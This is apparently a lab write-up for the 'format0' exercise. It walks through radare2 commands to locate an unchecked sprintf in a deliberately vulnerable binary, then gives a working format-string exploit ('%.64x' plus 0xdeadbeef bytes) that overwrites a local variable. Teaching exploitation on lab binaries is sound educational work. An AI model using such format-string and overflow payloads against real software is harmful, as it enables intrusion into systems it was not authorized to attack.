In this exercise, we have a binary that if we analyze in radare2, we'll see that it takes the parameter argv[1]. To see that we just type:
    $ r2 format0
    > aaa
    > afl
    > s main
    > pdf

With this we see it uses a variable called arg_ch, that is ebp+0xc, ebp+0xc, points to second argument of a function, that in the case of main it is argv, so we can change the name:
    > afvf # to see the names
    > afvn argv arg_ch
    > pdf

With this we can see that access to value pointed by argv, add 4 so we already point to second index of argv (argv[1]). And giving that addres to function sym.vuln. Let's follow that function:
    > s sym.vuln
    > pdf
    > afvn buffer s
    > afvn modified var_ch
    > afvn user_string arg_8h
    > pdf

Problem in this code, is the use of sprintf withour checking size of user string, so user can insert any number of bytes, causing a buffer overflow. Also sprintf is giving the buffer and the user string without a format, so we can use *printf formats to write the number of bytes with less than 10 bytes. Let's going to see how many number of bytes we need until we modify the integer:
    > afvf
    0x00000068  format:    char *
    0x0000004c  buffer:    char *
    0x0000000c  modified:  int32_t

The difference between buffer and modified is 0x40 that in decimal is 64 bytes, using the format string space: %.64x we can specify to express a number with 64 characters, and then the number to write that we can see in radare2: 0xdeadbeef. Now we execute:

    ./format0 %.64x`python -c "print '\xef\xbe\xad\xde'"`
    you have hit the target correctly :)

So we've learnt about format string, how to give a big string to fill a buffer with less than 10 bytes.

